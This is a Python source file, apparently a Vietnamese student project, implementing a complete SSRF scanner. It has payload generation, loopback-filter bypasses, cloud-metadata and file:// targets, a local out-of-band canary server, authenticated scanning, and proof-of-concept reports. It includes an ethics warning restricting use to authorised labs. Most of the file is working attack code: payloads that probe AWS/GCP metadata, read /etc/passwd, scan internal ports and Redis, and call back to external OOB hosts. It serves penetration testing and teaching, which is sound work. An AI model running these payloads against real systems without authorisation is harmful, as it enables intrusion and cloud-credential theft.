#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================================
 ssrf_scanner.py  -  Cong cu phat hien & kiem thu lo hong SSRF  (ALL-IN-ONE)
==============================================================================
 Do an mon hoc. Viet bang Python THUAN (>=3.10), KHONG can cai thu vien ngoai.

 CANH BAO DAO DUC:
   Chi su dung tren he thong BAN SO HUU hoac DUOC CAP PHEP (lab, CTF, may ao).
   Quet he thong khong duoc phep la vi pham phap luat.

 4 ky thuat phat hien:
   - OAST (out-of-band): chen URL tro ve server canary; nhan callback => CHAC CHAN
   - Direct            : response lo dau hieu noi bo (metadata, root:x:0:0) => CHAC CHAN
   - Time-based        : tro IP khong phan hoi, do chenh lech thoi gian => KHA NANG CAO
   - Error/diff        : response khac han baseline voi muc tieu noi bo => NGHI NGO

 Vi du:
   python ssrf_scanner.py -u "http://127.0.0.1:5000/fetch?url=FUZZ" --oast-listen 8000
   python ssrf_scanner.py -u "http://host/page?img=http://a.com&id=1"
   python ssrf_scanner.py -u "http://host/api?target=x" -p target -o report.json
==============================================================================
"""
from __future__ import annotations

import argparse
import getpass
import http.cookiejar
import ipaddress
import json
import secrets
import sys
import threading
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

# Console Windows mac dinh cp1252 -> ep UTF-8 de in duoc tieng Viet co dau.
try:
    sys.stdout.reconfigure(encoding="utf-8")
    sys.stderr.reconfigure(encoding="utf-8")
except Exception:
    pass

FUZZ = "FUZZ"  # marker nguoi dung dat vao URL de chi diem chen

BANNER = r"""
  ___ ___ ___  ___   ___
 / __/ __| _ \| __| / __| __ __ _ _ _
 \__ \__ \   /| _|  \__ \/ _/ _` | ' \
 |___/___/_|_\|_|   |___/\__\__,_|_||_|   SSRF Scanner v1.1 (all-in-one)
   Chi dung cho muc dich hoc tap / kiem thu DUOC CAP PHEP
"""


# =============================================================================
#  PHAN 1 - SINH PAYLOAD (+ ky thuat bypass filter)
# =============================================================================
@dataclass
class Payload:
    value: str                 # chuoi se thay vao tham so
    technique: str             # direct / bypass / port-scan / scheme / time / oast
    target: str                # muc tieu mo ta
    note: str = ""             # ghi chu
    oast_token: str = ""       # token OAST de doi chieu callback
    signatures: list[str] = field(default_factory=list)  # dau hieu can tim trong response


# Cac muc tieu noi bo "ngon an" + dau hieu nhan biet noi dung noi bo trong response
INTERNAL_TARGETS: list[tuple[str, list[str]]] = [
    ("127.0.0.1", []),
    ("localhost", []),
    ("0.0.0.0", []),
    ("169.254.169.254", ["ami-id", "instance-id", "iam", "meta-data", "computeMetadata"]),  # AWS/cloud metadata
    ("metadata.google.internal", ["computeMetadata", "project-id"]),                        # GCP
    ("100.100.100.100", ["meta-data"]),                                                     # Alibaba
]
FILE_SIGNATURES = ["root:x:0:0:", "daemon:", "[extensions]", "for 16-bit app support"]


def _ip_variants(host: str) -> list[tuple[str, str]]:
    """Voi host IPv4, sinh cac bien the ma hoa khac nhau de BYPASS filter."""
    try:
        ip = ipaddress.IPv4Address(host)
    except ipaddress.AddressValueError:
        return []
    n = int(ip)
    variants = [
        (str(ip), "dang thap phan chuan"),
        (str(n), "IP dang so nguyen (decimal)"),
        (hex(n), "IP dang hex (0x...)"),
        ("0" + oct(n)[2:], "IP dang octal"),
    ]
    if str(ip).split(".")[0] == "127":
        variants.append(("127.1", "localhost rut gon 127.1"))
    return variants


def build_payloads(oast_host: str | None = None, include_file_scheme: bool = True) -> list[Payload]:
    payloads: list[Payload] = []

    # 1) Direct + bypass toi cac muc tieu noi bo
    for host, sigs in INTERNAL_TARGETS:
        variants = _ip_variants(host) or [(host, "dang ten/host chuan")]
        for value, desc in variants:
            technique = "direct" if desc.endswith("chuan") else "bypass"
            payloads.append(Payload(f"http://{value}/", technique, host, desc, signatures=sigs))
            for port in (80, 8080, 22, 3306, 6379):
                payloads.append(Payload(
                    f"http://{value}:{port}/", "port-scan", f"{host}:{port}",
                    f"do cong {port} ({desc})", signatures=sigs))

    # 2) Bypass bang '@'
    payloads.append(Payload("http://expected-trusted.com@127.0.0.1/", "bypass",
                            "127.0.0.1", "dung '@' danh lua phan host"))

    # 2b) Loopback THAY THE: ca dai 127.0.0.0/8 deu la loopback -> vuot blacklist
    #     chi chan dung chuoi "127.0.0.1". Day la ky thuat bypass rat thuc te.
    for alt in ("127.0.0.2", "127.0.0.3", "127.1.1.1", "127.127.127.127"):
        payloads.append(Payload(f"http://{alt}/", "bypass", alt,
                                "loopback thay the (vuot blacklist 127.0.0.1)"))

    # 3) IPv6 loopback
    payloads.append(Payload("http://[::1]/", "bypass", "::1", "IPv6 loopback"))
    payloads.append(Payload("http://[0:0:0:0:0:ffff:127.0.0.1]/", "bypass",
                            "127.0.0.1", "IPv4-mapped IPv6"))
    # 4) Scheme khac
    if include_file_scheme:
        for path in ("/etc/passwd", "/etc/hostname", "c:/windows/win.ini"):
            payloads.append(Payload(f"file://{path}", "scheme", path,
                                    "doc file noi bo qua file://", signatures=FILE_SIGNATURES))
        payloads.append(Payload("dict://127.0.0.1:6379/info", "scheme", "redis",
                                "tham do redis qua dict://"))
    # 5) Time-based (blind): IP non-routable -> timeout dai
    payloads.append(Payload("http://10.255.255.1/", "time", "10.255.255.1",
                            "IP non-routable, do chenh lech timeout (blind)"))
    # 6) OAST (tin cay nhat) - ho tro nhieu loai server OOB:
    #      * Burp Collaborator / interactsh / requestrepo (domain) -> token o SUBDOMAIN (bat ca DNS)
    #      * webhook.site / dich vu co duong dan rieng          -> token o PATH
    #      * canary cuc bo / IP                                 -> token o PATH
    if oast_host:
        has_scheme = "://" in oast_host
        parsed = urlparse(oast_host if has_scheme else "http://" + oast_host)
        netloc = parsed.netloc or oast_host
        base_path = parsed.path.rstrip("/")  # '' neu khong co path
        host_only = netloc.split(":")[0]
        port_part = (":" + netloc.split(":")[1]) if ":" in netloc else ""
        is_ip = host_only.count(".") == 3 and all(p.isdigit() for p in host_only.split("."))

        # Co path (vd webhook.site/<uuid>) hoac la IP -> gan token vao PATH.
        # Domain tran (Burp/interactsh/requestrepo) -> gan token vao SUBDOMAIN.
        path_mode = bool(base_path) or is_ip
        schemes = [parsed.scheme] if has_scheme else ("http", "https")

        # Danh sach canary: ban than no; neu la 127.0.0.1 (canary cuc bo) thi them
        # loopback thay the de VUOT filter ma van goi ve canary (binding 0.0.0.0).
        canary = [(netloc, base_path, "callback truc tiep")]
        if host_only == "127.0.0.1" and not base_path:
            for alt in ("127.0.0.2", "127.1.1.1"):
                canary.append((alt + port_part, "",
                               f"loopback thay the {alt} (vuot blacklist)"))

        for cnet, cpath, cnote in canary:
            for scheme in schemes:
                token = secrets.token_hex(6)
                if path_mode or cpath:
                    value = f"{scheme}://{cnet}{cpath}/{token}"
                else:
                    value = f"{scheme}://{token}.{cnet}/ssrf"
                payloads.append(Payload(value, "oast", cnet,
                                        f"{cnote} ({scheme})", oast_token=token))
    return payloads


# =============================================================================
#  PHAN 2 - SERVER CANARY OAST (bat callback blind SSRF)
# =============================================================================
class _Interactions:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._hits: list[dict] = []

    def add(self, hit: dict) -> None:
        with self._lock:
            self._hits.append(hit)

    def has_token(self, token: str) -> bool:
        if not token:
            return False
        with self._lock:
            return any(token in h["raw"] for h in self._hits)


INTERACTIONS = _Interactions()


class _CanaryHandler(BaseHTTPRequestHandler):
    def _record(self) -> None:
        INTERACTIONS.add({
            "time": time.time(), "method": self.command, "path": self.path,
            "src": self.client_address[0],
            "raw": f"{self.command} {self.path} Host:{self.headers.get('Host', '')}",
        })
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ok")

    do_GET = do_POST = do_PUT = do_HEAD = _record

    def log_message(self, *a) -> None:
        pass


class OastServer:
    def __init__(self, host: str = "0.0.0.0", port: int = 8000) -> None:
        self.host, self.port = host, port
        self._server: ThreadingHTTPServer | None = None

    def start(self) -> None:
        self._server = ThreadingHTTPServer((self.host, self.port), _CanaryHandler)
        threading.Thread(target=self._server.serve_forever, daemon=True).start()

    def stop(self) -> None:
        if self._server:
            self._server.shutdown()
            self._server.server_close()


# =============================================================================
#  PHAN 3 - LOI PHAT HIEN (chay da luong bang ThreadPoolExecutor)
# =============================================================================
@dataclass
class Finding:
    param: str
    payload: Payload
    verdict: str          # CONFIRMED / LIKELY / POSSIBLE
    evidence: str
    status: int | None = None
    elapsed: float = 0.0


@dataclass
class Baseline:
    status: int | None
    length: int
    elapsed: float


@dataclass
class _Resp:
    status: int | None
    body: str
    length: int


SUSPICIOUS_PARAMS = {
    "url", "uri", "link", "src", "source", "dest", "destination", "redirect",
    "redirect_uri", "return", "returnurl", "next", "path", "continue", "img",
    "image", "imageurl", "fetch", "feed", "host", "site", "html", "file",
    "document", "domain", "callback", "webhook", "proxy", "load", "page", "data",
}


# Moi "diem chen" la cap (location, param): location = 'url' (query string) hoac 'data' (body POST).
def find_injection_points(url, data, explicit_param):
    if FUZZ in url:
        return [("url", FUZZ)]
    if data and FUZZ in data:
        return [("data", FUZZ)]

    points = []
    if explicit_param:
        q = dict(parse_qsl(urlparse(url).query))
        d = dict(parse_qsl(data)) if data else {}
        if explicit_param in q:
            points.append(("url", explicit_param))
        if explicit_param in d:
            points.append(("data", explicit_param))
        return points or [("url", explicit_param)]

    # Tu dong: uu tien tham so ten nghi ngo, khong co thi lay tat ca
    q = dict(parse_qsl(urlparse(url).query))
    sus_q = [k for k in q if k.lower() in SUSPICIOUS_PARAMS]
    points += [("url", k) for k in (sus_q or list(q.keys()))]
    if data:
        d = dict(parse_qsl(data))
        sus_d = [k for k in d if k.lower() in SUSPICIOUS_PARAMS]
        points += [("data", k) for k in (sus_d or list(d.keys()))]
    return points


def _inject_str(s: str, param: str, value: str) -> str:
    """Chen value vao param trong mot query-string (dung cho ca URL va body)."""
    if param == FUZZ:
        return s.replace(FUZZ, value)
    qs = dict(parse_qsl(s))
    qs[param] = value
    return urlencode(qs)


def _apply(url, data, loc, param, value):
    """Tra ve (url_moi, data_moi) sau khi chen payload vao dung vi tri."""
    if loc == "url":
        if param == FUZZ:
            return url.replace(FUZZ, value), data
        parts = urlparse(url)
        return urlunparse(parts._replace(query=_inject_str(parts.query, param, value))), data
    else:  # loc == "data"
        return url, _inject_str(data or "", param, value)


class Scanner:
    def __init__(self, *, oast_host=None, timeout=8.0, concurrency=10,
                 time_threshold=5.0, method="GET", headers=None,
                 data=None, cookie=None) -> None:
        self.oast_host = oast_host
        self.timeout = timeout
        self.concurrency = concurrency
        self.time_threshold = time_threshold
        self.method = method.upper()
        self.headers = dict(headers or {})
        self.data = data            # body POST (chuoi x-www-form-urlencoded, co the chua FUZZ)
        if cookie:
            self.headers["Cookie"] = cookie
        # Opener co cookie jar -> giu session xuyen suot (ke ca sau khi login)
        self.cookiejar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookiejar))

    def login(self, auth_url, user, password, user_field="username", pass_field="password",
              extra: dict | None = None) -> bool:
        """Dang nhap bang form de lay session cookie (POST x-www-form-urlencoded)."""
        fields = {user_field: user, pass_field: password}
        if extra:
            fields.update(extra)
        body = urlencode(fields).encode()
        try:
            req = urllib.request.Request(auth_url, data=body, method="POST",
                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
            self.opener.open(req, timeout=self.timeout)
            got = [c.name for c in self.cookiejar]
            print(f" [*] Dang nhap xong. Cookie nhan duoc: {got or '(khong co - kiem tra lai)'}")
            return bool(got)
        except Exception as e:
            print(f" [!] Loi dang nhap: {type(e).__name__}: {e}")
            return False

    def cookie_header(self) -> str:
        """Gom cookie hien co (tu --cookie va/hoac session sau login) thanh 1 chuoi."""
        parts = []
        if self.headers.get("Cookie"):
            parts.append(self.headers["Cookie"])
        parts += [f"{c.name}={c.value}" for c in self.cookiejar]
        return "; ".join(parts)

    def _request(self, url: str, data: str | None = None):
        start = time.perf_counter()
        method = "POST" if data else self.method
        body = data.encode() if data else None
        try:
            req = urllib.request.Request(url, data=body, method=method, headers=self.headers)
            with self.opener.open(req, timeout=self.timeout) as r:
                content = r.read(20000).decode("utf-8", "replace")
                return _Resp(r.status, content, len(content)), time.perf_counter() - start, None
        except urllib.error.HTTPError as e:
            content = ""
            try:
                content = e.read(20000).decode("utf-8", "replace")
            except Exception:
                pass
            return _Resp(e.code, content, len(content)), time.perf_counter() - start, f"HTTP{e.code}"
        except Exception as e:
            return None, time.perf_counter() - start, type(e).__name__

    def _baseline(self, url, data, loc, param) -> Baseline:
        u, d = _apply(url, data, loc, param, "http://example.com/")
        resp, elapsed, _ = self._request(u, d)
        return Baseline(resp.status if resp else None, resp.length if resp else 0, elapsed)

    def _analyze(self, p, resp, elapsed, err, baseline) -> Finding | None:
        body = resp.body.lower() if resp is not None else ""

        if p.technique == "oast" and INTERACTIONS.has_token(p.oast_token):
            return Finding("", p, "CONFIRMED",
                           f"Nhan callback OAST voi token {p.oast_token}",
                           resp.status if resp else None, elapsed)

        for sig in p.signatures:
            if sig.lower() in body:
                return Finding("", p, "CONFIRMED",
                               f"Response chua dau hieu noi bo: '{sig}'",
                               resp.status if resp else None, elapsed)

        if p.technique == "time":
            if elapsed >= self.time_threshold and elapsed > baseline.elapsed * 3 + 1:
                return Finding("", p, "LIKELY",
                               f"Phan hoi {elapsed:.1f}s (baseline {baseline.elapsed:.1f}s) "
                               f"-> server co the dang co ket noi IP noi bo",
                               resp.status if resp else None, elapsed)

        if p.technique in ("direct", "bypass", "port-scan", "scheme") and resp is not None:
            if resp.status and resp.status < 400 and abs(resp.length - baseline.length) > 200:
                return Finding("", p, "POSSIBLE",
                               f"Response khac baseline (len {resp.length} vs "
                               f"{baseline.length}, status {resp.status})",
                               resp.status, elapsed)
        return None

    def scan_point(self, url, data, loc, param, payloads) -> list[Finding]:
        label = f"{loc}:{param}"  # vd 'url:FUZZ' hoac 'data:url'
        baseline = self._baseline(url, data, loc, param)
        findings: list[Finding] = []

        def run(p: Payload):
            u, d = _apply(url, data, loc, param, p.value)
            resp, elapsed, err = self._request(u, d)
            f = self._analyze(p, resp, elapsed, err, baseline)
            if f:
                f.param = label
            return f

        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
            for f in pool.map(run, payloads):
                if f:
                    findings.append(f)

        # OAST callback co the toi tre -> cho roi quet lai
        oast_payloads = [p for p in payloads if p.technique == "oast"]
        if oast_payloads:
            time.sleep(2.0)
            for p in oast_payloads:
                if INTERACTIONS.has_token(p.oast_token) and not any(
                    f.payload.oast_token == p.oast_token for f in findings
                ):
                    findings.append(Finding(label, p, "CONFIRMED",
                                             f"Nhan callback OAST (tre) token {p.oast_token}"))
        return findings

    def scan(self, url: str, explicit_param: str | None):
        points = find_injection_points(url, self.data, explicit_param)
        payloads = build_payloads(oast_host=self.oast_host)
        results: list[Finding] = []
        for loc, param in points:
            results.extend(self.scan_point(url, self.data, loc, param, payloads))
        labels = [f"{loc}:{p}" for loc, p in points]
        return results, labels, payloads


# =============================================================================
#  PHAN 4 - BAO CAO + KET LUAN (in ra payload hoat dong)
# =============================================================================
# Muc do tin cay (confidence) theo chuan cong cu bao mat (vd Burp Suite):
#   CONFIRMED  - co bang chung truc tiep (callback OAST / lo du lieu noi bo)
#   FIRM       - do tin cay cao nhung gian tiep (blind theo thoi gian)
#   TENTATIVE  - dau hieu bat thuong, can xac minh thu cong
VERDICT_ORDER = {"CONFIRMED": 0, "LIKELY": 1, "POSSIBLE": 2}
VERDICT_LABEL = {
    "CONFIRMED": "[CONFIRMED]",
    "LIKELY":    "[FIRM]     ",
    "POSSIBLE":  "[TENTATIVE]",
}
VERDICT_NAME = {"CONFIRMED": "CONFIRMED", "LIKELY": "FIRM", "POSSIBLE": "TENTATIVE"}
SEVERITY = "High"  # SSRF nhin chung xep muc nghiem trong cao (CVSS ~7-9)


def print_report(findings, params, payloads) -> None:
    print("\n" + "=" * 66)
    print(" SSRF SCAN FINDINGS")
    print("=" * 66)
    print(f" Injection points : {', '.join(params) or '(none)'}")
    print(f" Payloads/point   : {len(payloads)}")
    print(f" Total findings   : {len(findings)}")
    print("-" * 66)

    if not findings:
        print(" No SSRF indicators detected.")
        return

    for i, f in enumerate(sorted(findings, key=lambda x: VERDICT_ORDER.get(x.verdict, 9)), 1):
        label = VERDICT_LABEL.get(f.verdict, f.verdict)
        print(f"\n [{i:02d}] {label}  Severity: {SEVERITY}  |  Type: SSRF")
        print(f"      Injection : {f.param}")
        print(f"      Technique : {f.payload.technique} ({f.payload.note})")
        print(f"      Payload   : {f.payload.value}")
        print(f"      Evidence  : {f.evidence}")
        if f.status is not None:
            print(f"      Response  : HTTP {f.status}  |  {f.elapsed:.2f}s")


def _reconstruct(url, data, label, value):
    """Tu label 'loc:param' dung lai (url, data) day du da chen payload."""
    loc, _, param = label.partition(":")
    if loc not in ("url", "data"):  # phong truong hop label la thang truc tiep
        loc, param = "url", label
    return _apply(url, data, loc, param, value)


def print_conclusion(findings, url, params, data=None, cookie=None) -> None:
    """Tom tat ket luan + danh sach payload tai hien duoc (proof-of-concept)."""
    print("\n" + "#" * 66)
    print("#  SUMMARY")
    print("#" * 66)

    confirmed = [f for f in findings if f.verdict == "CONFIRMED"]
    likely = [f for f in findings if f.verdict == "LIKELY"]
    possible = [f for f in findings if f.verdict == "POSSIBLE"]

    if confirmed:
        print(f"\n  Verdict : VULNERABLE - SSRF confirmed ({len(confirmed)} confirmed case(s)).")
    elif likely:
        print("\n  Verdict : LIKELY VULNERABLE - blind SSRF (time-based); verify manually.")
    elif possible:
        print("\n  Verdict : POTENTIAL - anomalies observed; manual verification required.")
    else:
        print("\n  Verdict : NOT DETECTED - no SSRF indicators with the current payload set.")
        print("#" * 66 + "\n")
        return
    print(f"  Severity: {SEVERITY}   |   Type: SSRF (CWE-918)")

    # Gom cac payload hoat dong (uu tien theo muc do), loai trung
    working = sorted(findings, key=lambda x: VERDICT_ORDER.get(x.verdict, 9))
    seen = set()
    print("\n  PROOF-OF-CONCEPT - working payloads (copy for report / reproduction):")
    print("  " + "-" * 62)
    for f in working:
        key = (f.param, f.payload.value)
        if key in seen:
            continue
        seen.add(key)
        full_url, full_data = _reconstruct(url, data, f.param, f.payload.value)
        print(f"  {VERDICT_LABEL.get(f.verdict, f.verdict)}  {f.param}  ({f.payload.technique})")
        print(f"      payload   : {f.payload.value}")
        print(f"      full URL  : {full_url}")
        if full_data:
            print(f"      POST body : {full_data}")
        print(f"      rationale : {f.evidence}")
        print("  " + "-" * 62)

    # Lenh curl tai hien nhanh payload manh nhat
    best = working[0]
    bu, bd = _reconstruct(url, data, best.param, best.payload.value)
    curl = "curl -s"
    if cookie:
        curl += f' -b "{cookie}"'
    if bd:
        curl += f' --data "{bd}"'
    curl += f' "{bu}"'
    print("\n  Reproduce the strongest finding:")
    print(f"      {curl}")
    print("\n" + "#" * 66 + "\n")


def save_json(findings, params, path: str) -> None:
    data = {
        "vulnerability": "SSRF",
        "cwe": "CWE-918",
        "severity": SEVERITY,
        "vulnerable": any(f.verdict == "CONFIRMED" for f in findings),
        "injection_points": params,
        "findings": [{
            "injection_point": f.param,
            "confidence": VERDICT_NAME.get(f.verdict, f.verdict),  # CONFIRMED / FIRM / TENTATIVE
            "technique": f.payload.technique,
            "payload": f.payload.value,
            "evidence": f.evidence,
            "http_status": f.status,
            "elapsed_s": round(f.elapsed, 3),
        } for f in findings],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, ensure_ascii=False, indent=2)
    print(f" Report saved: {path}")


# =============================================================================
#  PHAN 5 - CLI
# =============================================================================
def parse_headers(items) -> dict:
    headers = {}
    for it in items or []:
        if ":" in it:
            k, v = it.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers


def parse_raw_request(path: str, force_https: bool = False):
    """
    Doc 1 raw HTTP request (xuat tu Burp Suite 'Copy to file' / Save item, hoac
    cac cong cu tuong tu) va tach thanh (method, url, headers, data).

    Vi du file:
        POST /api/fetch?x=1 HTTP/1.1
        Host: target.com
        Cookie: session=abc
        Content-Type: application/x-www-form-urlencoded

        url=FUZZ&id=1

    Dat marker FUZZ o duong dan hoac body de chi diem chen (khong co thi tu tim).
    """
    raw = open(path, "rb").read().decode("utf-8", "replace").replace("\r\n", "\n")
    head, _, body = raw.partition("\n\n")
    lines = [ln for ln in head.split("\n") if ln.strip()]
    if not lines:
        raise ValueError("File request rong hoac sai dinh dang.")

    first = lines[0].split()
    if len(first) < 2:
        raise ValueError("Dong dau request khong hop le (can 'METHOD duong-dan').")
    method, target = first[0].upper(), first[1]

    headers, host = {}, ""
    for ln in lines[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            k, v = k.strip(), v.strip()
            if k.lower() == "host":
                host = v
            headers[k] = v

    scheme = "https" if force_https or host.endswith(":443") else "http"
    if target.startswith(("http://", "https://")):
        url = target
    else:
        url = f"{scheme}://{host}{target}"

    # Bo cac header de urllib tu tinh lai, tranh xung dot
    for drop in ("Host", "Content-Length"):
        for k in [h for h in headers if h.lower() == drop.lower()]:
            headers.pop(k)

    data = body.strip("\n") or None
    return method, url, headers, data


def _ask(prompt, default=""):
    """Hoi 1 dong, co gia tri mac dinh (Enter = lay mac dinh)."""
    suffix = f" [{default}]" if default else ""
    val = input(f" ? {prompt}{suffix}: ").strip()
    return val or default


def _ask_yes(prompt, default=False):
    d = "Y/n" if default else "y/N"
    val = input(f" ? {prompt} ({d}): ").strip().lower()
    if not val:
        return default
    return val in ("y", "yes", "co", "c")


def interactive_fill(args) -> None:
    """Che do tuong tac: hoi tung thong tin can de test cho chuan."""
    print(" === CHE DO TUONG TAC === (Enter de lay mac dinh)\n")
    args.url = _ask("URL muc tieu (dat FUZZ o diem chen, vd http://host/fetch?url=FUZZ)", args.url or "")
    if FUZZ not in (args.url or ""):
        args.param = _ask("Ten tham so can test (de trong = tu dong tim)", args.param or "")
    args.method = _ask("HTTP method", args.method or "GET").upper()

    # Body POST
    if _ask_yes("Co body POST khong? (test SSRF trong body)", False):
        args.data = _ask("Body (x-www-form-urlencoded, co the chua FUZZ, vd url=FUZZ&id=1)", args.data or "")

    # Session: cookie co san hoac login
    if _ask_yes("Da co cookie/session san?", False):
        args.cookie = _ask("Cookie (vd 'session=abc; token=xyz')", args.cookie or "")
    elif _ask_yes("Dang nhap bang username/password de lay session?", False):
        args.auth_url = _ask("URL endpoint dang nhap (nhan POST)", args.auth_url or "")
        args.auth_user_field = _ask("Ten truong username", args.auth_user_field or "username")
        args.auth_pass_field = _ask("Ten truong password", args.auth_pass_field or "password")
        args.auth_user = _ask("Username", args.auth_user or "")
        args.auth_pass = getpass.getpass(" ? Password (go an): ")

    # OOB / OAST
    if _ask_yes("Tu mo server canary OAST tren may nay?", True):
        port = _ask("Cong canary", str(args.oast_listen or 8000))
        args.oast_listen = int(port)
    elif _ask_yes("Dung dich vu OOB ben ngoai (vd interactsh)?", False):
        args.oast_host = _ask("Host OOB (vd abcd.oast.site)", args.oast_host or "")
    print()


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Cong cu phat hien va kiem thu SSRF (hoc tap / kiem thu duoc cap phep).",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    ap.add_argument("-u", "--url", help="URL muc tieu (co the chua marker FUZZ).")
    ap.add_argument("-r", "--request", metavar="FILE",
                    help="Doc raw HTTP request tu file (xuat tu Burp Suite / tool tuong tu).")
    ap.add_argument("--https", action="store_true",
                    help="Coi request tu -r la HTTPS (mac dinh HTTP).")
    ap.add_argument("-p", "--param", help="Ten tham so can chen payload (neu khong dung FUZZ).")
    ap.add_argument("-X", "--method", default="GET", help="HTTP method (mac dinh GET).")
    ap.add_argument("-H", "--header", action="append", help="Header 'Key: Value' (lap lai duoc).")
    ap.add_argument("-i", "--interactive", action="store_true",
                    help="Che do hoi tung thong tin (url/param/cookie/login/oob...).")
    ap.add_argument("--data", help="Body POST (x-www-form-urlencoded, co the chua FUZZ).")
    ap.add_argument("--cookie", help="Cookie/session san co, vd 'session=abc; token=xyz'.")
    # Dang nhap de lay session
    ap.add_argument("--auth-url", help="Endpoint dang nhap (POST) de lay session cookie.")
    ap.add_argument("--auth-user", help="Username dang nhap.")
    ap.add_argument("--auth-pass", help="Password dang nhap.")
    ap.add_argument("--auth-user-field", default="username", help="Ten truong username (mac dinh 'username').")
    ap.add_argument("--auth-pass-field", default="password", help="Ten truong password (mac dinh 'password').")
    # Mang / OOB
    ap.add_argument("--timeout", type=float, default=8.0, help="Timeout moi request (giay).")
    ap.add_argument("--concurrency", type=int, default=10, help="So request song song.")
    ap.add_argument("--time-threshold", type=float, default=5.0, help="Nguong giay cho time-based.")
    ap.add_argument("--oast-host", "--oob-url", dest="oast_host",
                    help="Server OOB/OAST ben ngoai: dan URL/host tu Burp Collaborator "
                         "('xxx.oastify.com'), interactsh/requestrepo ('xxx.oast.site'), hoac "
                         "webhook.site ('https://webhook.site/<uuid>'). Tool tu chon subdomain/path; "
                         "xem callback tren dashboard dich vu (tool chi tu xac nhan khi dung --oast-listen).")
    ap.add_argument("--oast-listen", type=int,
                    help="Tu mo server canary HTTP cuc bo o cong nay (tu dong xac nhan callback).")
    ap.add_argument("-o", "--output", help="Luu bao cao ra file JSON.")
    ap.add_argument("--no-banner", action="store_true")
    args = ap.parse_args()

    if not args.no_banner:
        print(BANNER)

    # Nap request tu Burp/tool neu co (-r). Gia tri tu CLI (-u/--data) co uu tien hon.
    req_headers = {}
    if args.request:
        try:
            m, u, h, d = parse_raw_request(args.request, args.https)
        except Exception as e:
            print(f" [!] Khong doc duoc request: {e}")
            return 2
        args.method = m
        args.url = args.url or u
        args.data = args.data or d
        req_headers = h
        print(f" [*] Nap request tu {args.request}: {m} {args.url}")

    # Vao che do tuong tac neu duoc yeu cau, hoac khi thieu URL (va khong dung -r)
    if args.interactive or (not args.url and not args.request):
        interactive_fill(args)
    if not args.url:
        print(" [!] Thieu URL muc tieu. Dung -u <url>, -r <file> hoac -i.")
        return 2

    # OOB ngoai: giu NGUYEN gia tri nguoi dung nhap (ke ca path nhu webhook.site/<uuid>).
    # build_payloads() se tu quyet dinh gan token vao subdomain hay path.

    oast_server = None
    if args.oast_listen:
        oast_server = OastServer(port=args.oast_listen)
        oast_server.start()
        print(f" [*] Server canary OAST cuc bo dang lang nghe o cong {args.oast_listen}")
        if not args.oast_host:
            args.oast_host = f"127.0.0.1:{args.oast_listen}"
            print(f" [*] --oast-host mac dinh = {args.oast_host}")
    elif args.oast_host:
        print(f" [*] Dung OOB ben ngoai: {args.oast_host}")
        print("     LUU Y: tool chi TU DONG xac nhan callback khi dung --oast-listen (canary cuc bo).")
        print("     Voi dich vu ngoai (requestrepo/interactsh...), hay xem callback tren dashboard cua ho.")

    # Header: tu request (-r) truoc, roi -H ghi de
    headers = {**req_headers, **parse_headers(args.header)}
    scanner = Scanner(
        oast_host=args.oast_host, timeout=args.timeout, concurrency=args.concurrency,
        time_threshold=args.time_threshold, method=args.method,
        headers=headers, data=args.data, cookie=args.cookie)

    # Dang nhap lay session neu duoc cung cap
    if args.auth_url and args.auth_user is not None:
        print(f" [*] Dang nhap vao {args.auth_url} ...")
        scanner.login(args.auth_url, args.auth_user, args.auth_pass or "",
                      args.auth_user_field, args.auth_pass_field)

    print(f" [*] Bat dau quet: {args.url}")
    if args.data:
        print(f" [*] Body POST : {args.data}")
    print()
    try:
        findings, params, payloads = scanner.scan(args.url, args.param)
    except KeyboardInterrupt:
        print("\n [!] Da dung.")
        return 130
    finally:
        if oast_server:
            oast_server.stop()

    print_report(findings, params, payloads)
    print_conclusion(findings, args.url, params, data=args.data,
                     cookie=scanner.cookie_header() or None)
    if args.output:
        save_json(findings, params, args.output)

    serious = [f for f in findings if f.verdict in ("CONFIRMED", "LIKELY")]
    return 1 if serious else 0


if __name__ == "__main__":
    sys.exit(main())
